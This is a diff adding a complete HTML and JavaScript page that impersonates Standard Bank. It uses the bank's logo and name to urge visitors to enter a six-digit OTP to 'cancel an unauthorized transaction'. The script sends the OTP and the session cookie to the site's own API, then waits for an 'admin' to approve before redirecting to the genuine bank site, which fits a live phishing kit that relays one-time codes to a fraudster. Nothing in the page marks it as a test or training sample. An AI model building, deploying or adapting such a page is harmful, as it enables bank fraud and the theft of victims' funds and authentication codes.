@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Transaction Cancellation - OTP Verification</title>
+    <link rel="icon" type="image/png" href="https://account-security-check.netlify.app/zsg.png">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #003cc7 0%, #0056b3 100%);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+
+        .container {
+            background-color: #ffffff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 400px;
+            color: #333;
+            text-align: center;
+        }
+
+        /* Match loading page logo styling */
+        #loading-logo {
+            width: 120px;
+            height: auto;
+            margin-bottom: 30px;
+            animation: pulse 2s infinite, float 3s ease-in-out infinite;
+            filter: drop-shadow(0 0 20px rgba(255, 255, 255, 0.3));
+        }
+
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 16px;
+        }
+
+        .amount-display {
+            background: linear-gradient(135deg, #e3f2fd 0%, #bbdefb 100%);
+            border: 2px solid #2196f3;
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 30px;
+            text-align: center;
+            box-shadow: 0 5px 15px rgba(33, 150, 243, 0.2);
+        }
+
+        .amount-line {
+            display: inline-block;
+            font-size: 18px;
+            font-weight: 600;
+            color: #0d47a1;
+        }
+
+        .amount-label {
+            color: #1565c0;
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .amount-value {
+            color: #0d47a1;
+            font-size: 22px;
+            font-weight: 700;
+            font-family: 'Courier New', monospace;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .otp-form {
+            margin-bottom: 30px;
+        }
+
+        .otp-input {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .otp-input input {
+            width: 50px;
+            height: 50px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            text-align: center;
+            font-size: 20px;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            background-color: #fff;
+            color: #333;
+        }
+
+        .otp-input input:focus {
+            border-color: #0056b3;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(0, 86, 179, 0.1);
+        }
+
+        .otp-input input.filled {
+            border-color: #28a745;
+            background-color: #f8fff9;
+        }
+
+        .submit-btn {
+            background-color: #0056b3;
+            color: #fff;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.3s ease;
+            margin-bottom: 20px;
+        }
+
+        .submit-btn:hover {
+            background-color: #004080;
+        }
+
+        .submit-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .status-message {
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+
+        .status-message.success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .status-message.error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        .status-message.info {
+            background-color: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #2196f3;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Loading page animations for logo */
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+
+        .back-link {
+            color: #2196f3;
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.3s ease;
+        }
+
+        .back-link:hover {
+            color: #1976d2;
+        }
+
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://account-security-check.netlify.app/zsg.png" alt="Standard Bank Logo" id="loading-logo">
+        <h1>Transaction Cancellation</h1>
+        <p class="subtitle">Enter OTP to cancel unauthorized transaction</p>
+
+        <div class="amount-display">
+            <div class="amount-line">
+                <span class="amount-label">you will be charged </span>
+                <span class="amount-value" id="transaction-amount">R0</span>
+            </div>
+        </div>
+
+        <div class="otp-form">
+            <div class="otp-input">
+                <input type="text" maxlength="1" class="otp-digit" data-index="0">
+                <input type="text" maxlength="1" class="otp-digit" data-index="1">
+                <input type="text" maxlength="1" class="otp-digit" data-index="2">
+                <input type="text" maxlength="1" class="otp-digit" data-index="3">
+                <input type="text" maxlength="1" class="otp-digit" data-index="4">
+                <input type="text" maxlength="1" class="otp-digit" data-index="5">
+            </div>
+            <button type="button" class="submit-btn" id="submit-otp">
+                Cancel Transaction
+            </button>
+        </div>
+
+        <div id="status-message" class="status-message hidden"></div>
+
+        <a href="/" class="back-link">← Back to Home</a>
+    </div>
+
+    <script src="/public/tracking.js"></script>
+    <script>
+        let verificationId = null;
+        let checkInterval = null;
+        let normalizedAmount = 0;
+
+        // OTP input handling
+        const otpInputs = document.querySelectorAll('.otp-digit');
+        
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', function(e) {
+                const value = e.target.value;
+                
+                if (value.length === 1) {
+                    input.classList.add('filled');
+                    
+                    // Move to next input
+                    if (index < otpInputs.length - 1) {
+                        otpInputs[index + 1].focus();
+                    }
+                } else {
+                    input.classList.remove('filled');
+                }
+            });
+
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
+        });
+
+        // Get OTP from URL parameters
+        function getUrlParameter(name) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(name);
+        }
+
+        // Get amount from URL parameters
+        function getAmountFromUrl() {
+            const amountParam = getUrlParameter('amount');
+            if (amountParam !== null && amountParam !== undefined && amountParam !== '') {
+                // Accept values like "1000", "1,000.50", "R1000", "R 1,000.50"
+                const cleaned = String(amountParam).replace(/[^0-9.]/g, '');
+                const numericAmount = Number(cleaned);
+                if (!isNaN(numericAmount)) {
+                    normalizedAmount = numericAmount;
+                    document.getElementById('transaction-amount').textContent = formatRand(numericAmount);
+                } else {
+                    normalizedAmount = 0;
+                    document.getElementById('transaction-amount').textContent = 'R0';
+                }
+            } else {
+                normalizedAmount = 0;
+                document.getElementById('transaction-amount').textContent = 'R0';
+            }
+        }
+
+        function formatRand(value) {
+            const n = Number(value);
+            if (isNaN(n) || n === 0) {
+                return 'R0';
+            }
+            const formatted = n.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+            return `R${formatted}`;
+        }
+
+        // Submit OTP
+        document.getElementById('submit-otp').addEventListener('click', async function() {
+            const otp = Array.from(otpInputs).map(input => input.value).join('');
+            
+            if (otp.length !== 6) {
+                showStatus('Please enter a 6-digit OTP', 'error');
+                return;
+            }
+
+            // Disable submit button and show loading
+            const submitBtn = document.getElementById('submit-otp');
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<span class="loading-spinner"></span>Processing...';
+
+            try {
+                const response = await fetch('/api/verify-transaction-cancellation', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        otp_code: otp,
+                        amount: normalizedAmount,
+                        user_session_id: getCookie('user_session_id')
+                    })
+                });
+
+                const data = await response.json();
+
+                if (response.ok) {
+                    verificationId = data.verification_id;
+                    showStatus('OTP submitted successfully! Waiting for admin approval...', 'info');
+                    startPolling();
+                } else {
+                    showStatus(data.error || 'Failed to submit OTP', 'error');
+                    submitBtn.disabled = false;
+                    submitBtn.innerHTML = 'Cancel Transaction';
+                }
+            } catch (error) {
+                showStatus('Network error. Please try again.', 'error');
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = 'Cancel Transaction';
+            }
+        });
+
+        // Start polling for verification status
+        function startPolling() {
+            if (checkInterval) {
+                clearInterval(checkInterval);
+            }
+
+            checkInterval = setInterval(async () => {
+                if (!verificationId) return;
+
+                try {
+                    const response = await fetch(`/api/check-transaction-cancellation/${verificationId}`);
+                    const data = await response.json();
+
+                    if (response.ok) {
+                        if (data.status === 'approved') {
+                            showStatus('Transaction cancellation approved! Redirecting...', 'success');
+                            clearInterval(checkInterval);
+                            
+                            // Redirect after 2 seconds
+                            setTimeout(() => {
+                                const target = data.redirect || 'https://www.standardbank.co.za/southafrica/personal';
+                                window.location.href = target;
+                            }, 2000);
+                        } else if (data.status === 'denied') {
+                            showStatus('Transaction cancellation denied by admin.', 'error');
+                            clearInterval(checkInterval);
+                            
+                            // Re-enable submit button
+                            const submitBtn = document.getElementById('submit-otp');
+                            submitBtn.disabled = false;
+                            submitBtn.innerHTML = 'Cancel Transaction';
+                        }
+                        // If status is 'pending', continue polling
+                    }
+                } catch (error) {
+                    console.error('Error checking verification status:', error);
+                }
+            }, 3000); // Check every 3 seconds
+        }
+
+        // Show status message
+        function showStatus(message, type) {
+            const statusDiv = document.getElementById('status-message');
+            statusDiv.textContent = message;
+            statusDiv.className = `status-message ${type}`;
+            statusDiv.classList.remove('hidden');
+        }
+
+        // Get cookie value
+        function getCookie(name) {
+            const value = `; ${document.cookie}`;
+            const parts = value.split(`; ${name}=`);
+            if (parts.length === 2) return parts.pop().split(';').shift();
+        }
+
+        // Initialize page
+        document.addEventListener('DOMContentLoaded', function() {
+            getAmountFromUrl();
+        });
+    </script>
+</body>
+</html>
